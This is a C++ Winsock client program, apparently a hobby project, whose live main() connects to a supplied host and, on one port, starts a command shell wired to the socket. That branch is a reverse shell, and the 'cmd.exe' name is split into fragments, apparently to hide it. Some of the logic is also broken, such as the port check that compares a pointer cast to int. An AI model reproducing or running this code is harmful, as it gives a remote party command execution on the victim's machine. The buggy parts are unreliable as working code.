#include "client.h"
#if 0
bool Client::connected = false;

Client::Client(std::string ip, int port) {
    //Winsock Startup
    WSAData wsaData;
    connection = INVALID_SOCKET;
    if (WSAStartup(MAKEWORD(2, 1), &wsaData) != 0) {
        exit(0);
    }
    std::cout << ip << std::endl;
    memset(&address, 0, sizeof(address));
    inet_pton(AF_INET, ip.c_str(), &address.sin_addr.s_addr);
    address.sin_port = htons(port); //Port 
    address.sin_family = AF_INET; //IPv4 Socket
}

bool Client::connectToServer() {
    connection = socket(address.sin_family, SOCK_STREAM, IPPROTO_TCP); //Set Connection socket
    u_long mode = 1;
    ioctlsocket(connection, FIONBIO, &mode);
    if (connect(connection, (SOCKADDR*)&address, sizeof(address)) != 0) {
        std::cout << "socket failed with error: " << WSAGetLastError() << std::endl;
        return false;
    }
    std::cout << "Connected" << std::endl;
    connected = true;
    return true;
}

bool Client::closeConnection() {
    if (closesocket(connection) == SOCKET_ERROR)
    {
        if (WSAGetLastError() == WSAENOTSOCK)
            return true; //return true since connection has already been closed

        std::cout << std::to_string(WSAGetLastError()) << std::endl;
        return false;
    }
    WSACleanup();
    return true;
}

bool Client::sendString(std::string message) {
    if (send(connection, message.c_str(), message.size(), 0) == SOCKET_ERROR) {
        std::cout << "send failed with error: " << WSAGetLastError() << std::endl;
        return false;
    }
    return true;
}

std::string Client::recvString() {
    std::string recvbuf;
    recvbuf.resize(DEFAULT_BUFLEN);
    int len = recv(connection, &recvbuf[0], DEFAULT_BUFLEN, 0);
    if (len == SOCKET_ERROR) {
        std::cout << "recv failed with error: " << WSAGetLastError() << std::endl;
        return NULL;
    }
    recvbuf.resize(len);
    return recvbuf;
}
#endif
const std::string& ServerConnection::recvMessage() {
    this->recv();
    return message();
}

bool ServerConnection::sendMessage(const std::string& buf) {
    if (!buf.empty()) {
        std::string msgLen;
        msgLen.resize(sizeof(messageLen));
        *(uint32_t*)&msgLen[0] = htonl(buf.size());
        out += msgLen + buf;
    }
    return this->send();
}

ServerConnection::~ServerConnection() {
    closesocket(socket);
}

int main(int argc, char** argv) {

    WSADATA wsaData;
    SOCKET connected = INVALID_SOCKET;
    struct addrinfo* result = NULL, * ptr = NULL, hints;
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Validate the parameters
    if (argc != 3) {
        std::cout << "usage: " << argv[0] << " server - name, port number" << std::endl;
        return 1;
    }

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cout << "WSAStartup failed with error: " << iResult << std::endl;
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(argv[1], argv[2], &hints, &result);
    if (iResult != 0) {
        std::cout << "getaddrinfo failed with error: " << iResult << std::endl;
        WSACleanup();
        return 1;
    }
 
    connected = socket(result->ai_family, SOCK_STREAM, IPPROTO_TCP); //Set Connection socket
    if (connected == INVALID_SOCKET) {
        std::cout << "socket failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    iResult = connect(connected, result->ai_addr, result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(connected);
        connected = INVALID_SOCKET;
    }
    //u_long mode = 1;
    //ioctlsocket(connected, FIONBIO, &mode);

    ServerConnection server(connected);
    //server.sendMessage("hello");
    //std::cout << server.recvMessage();

    if ((int)argv[2] == 27016) {
        fd_set readfds;
        std::string message = "";
        std::string response = "";

        FD_ZERO(&readfds);
        FD_SET(_fileno(stdin), &readfds);
        FD_SET(connected, &readfds);

        //COULDN'T GET THE ASYNC SOCKET AND STD::CIN TO WORK PROPERLY

        while (true) {
            //we want to receive data from stdin so add these file
            //descriptors to the file descriptor set. These also have to be reset
            //within the loop since select modifies the sets.
            fd_set recvfds = readfds;

            iResult = select(2, &recvfds, NULL, NULL, NULL);
            if (iResult == -1 && errno != EINTR)
            {
                std::cout << "Error in select: " << errno << std::endl;
                break;
            }
            else if (iResult == -1 && errno == EINTR)
            {
                std::cout << "Interrupted" << std::endl;
                break;
            }
            if (FD_ISSET(_fileno(stdin), &recvfds))
            {
                std::cin >> message;
                server.sendMessage(message);
            }
            if (FD_ISSET(connected, &recvfds))
            {
                response = server.recvMessage();
                if (!response.empty()) {
                    std::cout << response << std::endl;
                }
            }
        }
    }
    else if ((int)argv[2] == 27015) {
        STARTUPINFOA startup;
        PROCESS_INFORMATION process;

        TCHAR username[257];
        DWORD size = 257;
        GetUserName((TCHAR*)username, &size);

        std::string strtmp(&username[0], &username[(int)size - 1]);

        std::string path = "C:\\Users\\" + strtmp + "\\Downloads\\";

        memset(&startup, 0, sizeof(startup));
        startup.cb = sizeof(startup);
        startup.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        startup.hStdInput = startup.hStdOutput = startup.hStdError = (HANDLE)connected;
        WCHAR cm[256] = L"cm";
        WCHAR d[256] = L"d.exe";
        CreateProcessA(NULL, strcat((char*)cm, (char*)d), 0, 0, 1, 0, 0, 0, &startup, &process);
        WaitForSingleObject(process.hProcess, INFINITE);
        CloseHandle(process.hProcess);
        CloseHandle(process.hThread);
    }
}
/*
int main(int argc, char** argv) {

    // Validate the parameters
    if (argc != 3) {
        std::cout << "usage: " << argv[0] << " server - name, port number" << std::endl;
        return 1;
    }

    Client client = Client(argv[1], atoi(argv[2]));
    if (!client.connectToServer()) {
        std::cout << "Connection Failed" << std::endl;
    }
    std::string message = "placeholder";
    std::string response = "placeholder";
    std::cout << (message.compare("Close Connection")) << std::endl;
    while (!(message.compare("Close Connection") == 0 || response.compare("Close Connection") == 0)) {
        std::cout << "Message: ";
        std::cin >> message;
        if (!message.empty()) {
            client.sendString(message);
        }
        response = client.recvString();
        std::cout << response << std::endl;
    }
    client.closeConnection();
}
*/
/*
int main2(int argc, char** argv) {
    WSADATA wsaData;
    SOCKET connected = INVALID_SOCKET;
    struct addrinfo* result = NULL, * ptr = NULL, hints;
    const char* sendbuf = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    // Validate the parameters
    if (argc != 2) {
        std::cout << "usage: "<< argv[0] << " server - name"<< std::endl;
        return 1;
    }

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cout<< "WSAStartup failed with error: " << iResult << std::endl;
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        std::cout << "getaddrinfo failed with error: " << iResult << std::endl;
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        // Create a SOCKET for connecting to server
        connected = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (connected == INVALID_SOCKET) {
            std::cout << "socket failed with error: " << WSAGetLastError() << std::endl;
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(connected, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(connected);
            connected = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (connected == INVALID_SOCKET) {
        std::cout << "Unable to connect to server!" << std::endl;
        WSACleanup();
        return 1;
    }

    // Send an initial buffer
    iResult = send(connected, sendbuf, (int)strlen(sendbuf), 0);

    if (iResult == SOCKET_ERROR) {
        std::cout << "send failed with error: " << WSAGetLastError() << std::endl;
        closesocket(connected);
        WSACleanup();
        return 1;
    }

    std::cout << "Bytes sent: " << iResult << std::endl;;

    // shutdown the connection since no more data will be sent
    iResult = shutdown(connected, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        std::cout << "shutdown failed with error: " << WSAGetLastError() << std::endl;
        closesocket(connected);
        WSACleanup();
        return 1;
    }

    // Receive until the peer closes the connection
    do {

        iResult = recv(connected, recvbuf, recvbuflen, 0);
        if (iResult > 0)
            std::cout << "Bytes received: " << iResult << std::endl;
        else if (iResult == 0)
            std::cout << "Connection closed" << std::endl;
        else
            std::cout << "recv failed with error: " << WSAGetLastError() << std::endl;

    } while (iResult > 0);

    // cleanup
    closesocket(connected);
    WSACleanup();

    return 0;
}
*/